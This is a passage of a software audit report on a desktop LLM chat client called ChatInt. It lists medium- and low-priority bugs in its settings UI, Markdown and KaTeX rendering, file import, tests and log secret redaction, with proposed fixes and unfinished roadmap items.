  2. `_SECRET_PATTERNS` (`lines 13-18`) only matches `sk-...`, `AIza...`, `Bearer ...`, and `*API_KEY=...`, missing provider keys like Groq (`gsk_...`), xAI (`xai-...`), Perplexity (`pplx-...`), HuggingFace (`hf_...`), Cerebras (`csk-...`), or custom keys.
- **How to make it foolproof:** Perform secret scrubbing inside a custom `logging.Formatter.format()` subclass (scrubbing the **complete** formatted string including tracebacks) and also redact any non-trivial secret values currently configured in `.env` (excluding short non-secrets like `"ollama"`).

### NEW-M4. `default_model` Setting Has No UI Control in Settings → General & Stays Stuck at `"gpt-4o"`
- **Where:** `src/chatint/ui/app.js:63, 557, 1149-1172, 3086-3116`, `src/chatint/db.py:475`
- **What happens:** `app_settings.default_model` is seeded to `"gpt-4o"` (`db.py:475`) and used whenever opening a new tab (`app.js:557, 1152`), yet Settings → General (`app.js:3086-3116`) only renders **Default Provider** and **Default Thinking**—with no **Default Model** selector! If OpenAI remains the Default Provider and the user puts `gpt-5` first and `gpt-4o` fifth in their model list, every new tab still selects `gpt-4o` with no UI setting to change it.
- **How to make it foolproof:** Add a **Default Model** `<select>` in Settings → General (populated from the selected Default Provider's configured models, with `"Top Priority Model"` / explicit model choice) or default to `pModels[0]`.

### NEW-M5. Settings Buffer Clobbered by Background Sync & Edge-Case Bugs on Blank Name / Blank Base URL / New Custom Provider Fetch
- **Where:** `src/chatint/ui/app.js:2385-2406, 2957-2970, 3404-3418, 3450-3464, 3707-3730`
- **What happens:**
  1. In `onStreamEvent("provider_models_updated")` (`lines 2385-2406`), background sync events for the *old* saved `.env` key overwrite uncommitted `bufProv.sync_status`, `sync_error`, `api_key_mask`, and `fetched_model_ids` in `state.settingsBuffer` (even after the user typed a new key + clicked **Fetch** or clicked **Clear Key**), and `line 2402` re-renders Settings while a `<select>` dropdown is focused or when `#new-model-id-input` has unfocused text.
  2. Clearing `#prov-name-input` to `""` (`lines 3409, 3710`: `if (cleaned) activeProv.name = cleaned`) leaves the stale previous name in `buf`, allowing **Save Changes** to succeed with a hidden old name despite a blank input field.
  3. Clearing `#prov-base-url-input` to `""` passes `typedBaseUrl = null` (`line 2959`), causing `fetch_provider_models` to test the old saved `base_url` from SQLite instead of the default endpoint.
  4. Clicking **Fetch / Auto add** on a newly added, unsaved custom provider (`id = "provider_<timestamp>"`) without typing an API key (e.g., local vLLM/LM Studio or pre-existing `.env` key) passes `prov.id` without `prov.name` (`line 2970`), failing with `"API key for provider_176... is missing in .env"`.
- **How to make it foolproof:** Skip overwriting `bufProv` fields when that provider has uncommitted key/URL edits in `settingsBuffer`, include `SELECT` and non-empty draft inputs in the re-render guard, assign `activeProv.name = cleaned` unconditionally so empty names fail validation cleanly, pass `""` (not `null`) when `base_url` was edited, and pass `provider_name` / allow keyless localhost fetches for unsaved custom providers.

### NEW-M6. Unvalidated Bridge Endpoints (`add_provider`, `save_app_settings`, `import_conversation_content`) & Non-UTF-8 / Unbounded File Import
- **Where:** `src/chatint/bridge.py:429-435, 582-631`, `src/chatint/db.py:820-831`
- **What happens:**
  1. `DesktopBridge.add_provider` (`bridge.py:429-435`, unused by the UI) bypasses `is_valid_provider_name` and duplicate-name checks enforced in `save_settings`.
  2. `save_app_settings` (`db.py:820-831`) accepts arbitrary dictionary keys and unbounded values without allowlisting valid setting keys (`global_system_prompt`, `default_provider`, `default_model`, `default_thinking`, `theme`).
  3. `open_import_chat_dialog` (`bridge.py:605`) and `import_conversation_content` (`bridge.py:619`) enforce no file-size cap (importing a multi-hundred-MB file freezes the UI/DB) and `p.read_text(encoding="utf-8")` rejects UTF-8 BOM (`utf-8-sig`) or Windows `cp1252` files with raw `UnicodeDecodeError`.
- **How to make it foolproof:** Remove dead `add_provider` (or validate identically to `save_settings`), allowlist `save_app_settings` keys, enforce a reasonable import size cap (e.g., `25 MB`), and decode imported files with `utf-8-sig` fallback.

### NEW-M7. KaTeX Placeholder Leaks into Markdown URLs/Image Alt Text, Inline `$` Currency False Positives, & Stripped Task List Checkboxes
- **Where:** `src/chatint/ui/app.js:1881, 1937-2022`
- **What happens:**
  1. **Attribute placeholder corruption (`app.js:1955-1967, 1988`):** KaTeX regex extraction runs before `marked.parse`, turning `$...$` inside image `alt` text (`![Plot of $y=x^2$](url)`) or two `$` query params in a URL (`https://api.example.com/v1?$filter=a&$select=b`) into `@@CIT_<nonce>_MATH_0@@` inside an HTML attribute (`alt="..."` / `href="..."`), which `NodeFilter.SHOW_TEXT` (`line 1988`) never expands!
  2. **Inline `$` currency false positives (`app.js:1961-1965`):** Price expressions with two `$` symbols and no surrounding spaces—such as `"$100–$200"`, `"$5-$10"`, or `"$5/$10"`—match `\$([^\$\n\r]+?)\$` (`expr = "100–"` or `"5/"`), pass `expr.trim() === expr` and `!/^\d+(\.\d+)?$/`, and get rendered as italic KaTeX math (`100–200` with both `$` signs stripped)!
  3. **Display math `<div>` inside `<p>` (`app.js:1946, 2020`):** Injecting `<div class="katex-display-block">` inside `<p>` causes HTML re-parsing (`contentDiv.innerHTML = ...`) to split paragraphs into empty `<p></p>` tags.
  4. **GFM task-list checkboxes stripped (`app.js:1881`):** `sanitizeMarkdownDom` removes all `input` elements even though `checked` and `disabled` were added to `ALLOWED_MARKDOWN_ATTRS` (`line 1825`), breaking `- [x] task` lists.
- **How to make it foolproof:** Protect Markdown link/image destinations before `$` matching, require closing `$` not to be immediately followed by digits (`(?![0-9])`) so ranges like `$100–$200` and `$5/$10` are never treated as math, use `<span class="katex-display-block" style="display:block">` instead of `<div>`, and preserve `<input type="checkbox" disabled>` inside `<li>`.

---

## 4. Low-Priority / Minor Issues (Persistence, UI Glitches, Docs & Tests)

### L3. [Partially Fixed] Unconditional `beforeunload` IPC Call & Unreliable WebView2 Shutdown Flush
- **Where:** `src/chatint/ui/app.js:475-499`, `src/chatint/main.py:225-239`
- **What remains broken:** `flushTabsState()` (`app.js:475-481, 496`) calls `callApi("save_tabs_state", ...)` unconditionally on every `beforeunload` even when `persistTabsTimer === null` (no pending changes), while when `persistTabsTimer !== null` (dirty), an unawaited async WebView2 JS-to-Python RPC inside `beforeunload` is not guaranteed to finish before WinForms tears down the window.
- **How to make it foolproof:** Track a `tabsStateDirty` boolean so `flushTabsState()` is a no-op when clean, and hook `window.events.closing` on the Python side (or cache latest tab state in memory on fast lightweight updates) so shutdown persistence is deterministic.

### L5. [Partially Fixed] `README.md` Omits Standalone `.exe` Build Instructions, Data/Log Locations, & Test Commands
- **Where:** `README.md:1-70`
- **What remains broken:** While `README.md` now documents Web Search, Import/Export, and Split Panes, it still omits instructions for building the standalone executable (`ChatInt.spec` / PyInstaller output path), running the test suite (`unittest discover -s tests`), and locating user data/logs (`.env`, `data/chatint.db`, `data/logs/chatint.log`).
- **Fix:** Add brief **Building Standalone `.exe`**, **Data & Logs**, and **Running Tests** sections to `README.md`.

### L6. [Partially Fixed] `test_dist_exe.py` Hardcodes `dist/v0.4.0`, Skips Fresh Builds Without `chatint.db`, & Kills Live `ChatInt.exe` Sessions (`test_single_instance.py` Also Collides with Open App)
- **Where:** `tests/test_dist_exe.py:9-58`, `tests/test_single_instance.py:23-26`
- **What remains broken:**
  1. `test_dist_exe.py:9-16` still hardcodes `DIST_DIR = Path("dist/v0.4.0")` (no `CHATINT_EXE_PATH` override) and skips unless `DIST_DB.exists()`—which is **always `False` on a fresh PyInstaller build** before `ChatInt.exe` has been launched at least once!
  2. Worse, when `dist/v0.4.0/ChatInt.exe` and `data/chatint.db` *do* exist, running `unittest discover -s tests` executes `taskkill /F /IM ChatInt.exe` (`lines 33, 52`)—**force-killing any live ChatInt session the user has open on their desktop**—and spawns a visible GUI window during unit tests (`line 40` also calls `FindWindowW` without 64-bit `ctypes` `restype`/`argtypes`).
  3. `test_single_instance.py:24` acquires the production mutex `"Local\\ChatInt_SingleInstance_Mutex_v1"`, so running `unittest discover` while ChatInt is open on Windows fails `test_mutex_prevents_second_instance` and steals window focus!
- **How to make it foolproof:** Gate `test_dist_exe.py` behind an opt-in env var (`CHATINT_RUN_EXE_SMOKE=1` / `CHATINT_EXE_PATH`), kill only the spawned `proc1.pid` (never `/IM ChatInt.exe`), launch `ChatInt.exe` *before* asserting `DIST_DB` creation so fresh builds are actually tested, and allow `_ensure_single_instance(mutex_name=...)` to accept an isolated test mutex name in `test_single_instance.py`.

### NEW-L1. Double-Clicking Any Copy Button Permanently Locks Its Label to `"Copied!"` + Synchronous `URL.revokeObjectURL` Race
- **Where:** `src/chatint/ui/app.js:3938-3943, 4001-4012`
- **What happens:**
  1. `copyText` (`app.js:4004`) reads `const origHtml = btnElement.innerHTML` on every click. Clicking any message or code **Copy** button twice within `1800ms` captures the temporary `<i data-lucide="check">...Copied!` HTML as `origHtml`, leaving the button permanently stuck saying `"Copied!"`.
  2. `downloadExport` (`app.js:3942-3943`) calls `a.click(); URL.revokeObjectURL(url);` synchronously in the same tick, which can revoke the blob URL before WebView2 initiates the download read.
- **Fix:** Store `btnElement._origHtml ??= btnElement.innerHTML` + `clearTimeout(btnElement._copyTimer)`, and wrap `URL.revokeObjectURL(url)` in `setTimeout(..., 10000)`.

### NEW-L2. Modal `Escape` Handling, Inline Edit Bubble Layout Glitch, Missing IME `isComposing` Check, & Duplicate `conversationId` Tabs / Stale Split-Pane Headers
- **Where:** `src/chatint/ui/app.js:179-236, 398, 591, 1612-1617, 2077-2092, 2440, 2708, 4197-4229`, `src/chatint/ui/style.css:812-824, 1021-1028, 1206-1223`
- **What happens:**
  1. Pressing `Escape` to close a native `<select>` popup inside Settings bubbles to `window` `keydown` (`app.js:4205`) and closes/discards the entire Settings modal; pressing `Escape` inside an inline message edit `<textarea>` (`app.js:2078`) does not cancel editing; and `Ctrl+T` / `Ctrl+W` (`lines 4217-4229`) fail when `CapsLock` is active (`e.key === "T"`).
  2. `.user-bubble` (`style.css:812-824`) uses `white-space: pre-wrap` and shrink-wrapped width; setting multi-line indented `bubble.innerHTML` in `inlineEditUserMessage` (`app.js:2077-2083`) renders literal blank lines inside the bubble and keeps short bubbles (`"Hi"`) narrow while editing.
  3. `Enter`-to-send/confirm handlers (`app.js:235, 1613, 3233, 3536`) omit `!e.isComposing`, prematurely submitting unfinished CJK IME compositions.
  4. `bootstrapData` (`app.js:398`) can restore two tabs pointing to the same `conversationId`, and `chat_named` (`line 2440`) / sidebar rename (`line 2708`) do not update split-pane header switcher labels (`#pane-tab-label-${tab.id}`). Also wide Markdown tables (`style.css:1021`) lack horizontal `overflow-x: auto` wrapper scrolling in narrow split panes.
- **Fix:** Check `e.target.tagName !== "SELECT"` / active inline editors on `Escape`, normalize `e.key.toLowerCase()` on shortcuts, guard `!e.isComposing`, switch `.user-bubble` to `white-space: normal; width: 100%` during inline edit, deduplicate restored tab `conversationId`s, refresh pane header labels on rename, and wrap Markdown tables in a scrollable container.

### NEW-L3. `get_connection()` Overrides 30s Connection Timeout Down to 10s
- **Where:** `src/chatint/db.py:234-239`
- **What happens:** `sqlite3.connect(DB_PATH, timeout=30.0)` sets SQLite's busy timeout to `30,000 ms`, and line 238 immediately executes `conn.execute("PRAGMA busy_timeout=10000;")`, overriding it down to `10,000 ms`.
- **Fix:** Align `PRAGMA busy_timeout=30000;` with `timeout=30.0`.

---

## 5. Remaining Unimplemented & Partially Implemented Roadmap Items

### R1. [Unimplemented] Modularize the Three "God Files" (`app.js`, `db.py`, `streamer.py`)
- All three monoliths grew even larger in `d740fbd`: `src/chatint/ui/app.js` (**4,236 lines**), `src/chatint/db.py` (**1,686 lines**), and `src/chatint/streamer.py` (**1,503 lines**). Splitting `src/chatint/` into focused `storage/`, `providers/`, and `services/` modules and `src/chatint/ui/` into native ES modules (`<script type="module">`, zero Node/bundler required) remains unimplemented.

### R2. [Unimplemented] Unified `ProviderAdapter` Layer
- SDK client setup, model-prefix stripping, thinking-level fallback loops, error classification, and token usage extraction remain triplicated across `streamer.py`, `naming.py`, `web_search_tool.py`, and `client_manager.py`.

### R4. [Partially Implemented] Encrypted Secret Storage at Rest (Windows Credential Manager / DPAPI)
- `.env` writes are now locked and atomic (`db.py:107-126`), but secrets remain stored in plaintext in `.env` (`os.chmod(ENV_PATH, 0o600)` at `db.py:117` does not restrict user/process ACLs on Windows NTFS). Optional Windows DPAPI (`CryptProtectData` via `ctypes`) or Windows Credential Manager (`CredWriteW`/`CredReadW`) integration has not been added.

### R5. [Partially Implemented] Sequential Schema Migration Runner & Pre-Migration `.bak` Backup
- `init_db()` (`db.py:390-398`) now sets `PRAGMA user_version = 1` and creates `idx_messages_conv_role_created`, **but** still relies on ad-hoc `PRAGMA table_info(...)` column checks rather than a versioned `MIGRATIONS` runner and does **not** create an automatic `chatint.db.bak` backup before upgrading an existing lower-version database.

### R6. [Partially Implemented] Missing *"Open Logs Folder"* Button in Settings & Silent `except Exception: pass` Blocks
- `src/chatint/logging_setup.py` configures `RotatingFileHandler` (`data/logs/chatint.log`), `sys.excepthook`, and `threading.excepthook`, **but** the *"Open Logs Folder"* button in Settings → General (and corresponding `DesktopBridge.open_logs_folder()` RPC) was never added, and silent `except Exception: pass` blocks still remain in `db.py` (`lines 740, 767, 809`) and `client_manager.py` (`lines 181, 610`).

### R7. [Partially Implemented] Uniform `{ok, data, error}` Bridge DTO Envelope
- While `_clamp_max_context` and `_normalize_thinking_level` were added for conversation/stream inputs, `DesktopBridge` methods still return inconsistent shapes (`List`, `Optional[Dict]`, `{"success": True, ...}`, `{"error": ...}`, `{"cancelled": True}`) rather than a uniform `{"ok": bool, "data": ..., "error": Optional[str]}` contract.

### R8. [Partially Implemented] Missing Automated Frontend Sanitizer, KaTeX & Streaming State Tests
- `tests/test_suite.py` now runs 24 backend unit tests cleanly, **but** contains only static `assertIn` string checks against `index.html` and `app.js` (`lines 886-893`) with **zero behavioral tests** for `renderMarkdownWithEnhancements`, `sanitizeMarkdownDom`, `_isSafeUrl`, KaTeX inline style preservation, or the frontend streaming event state machine.
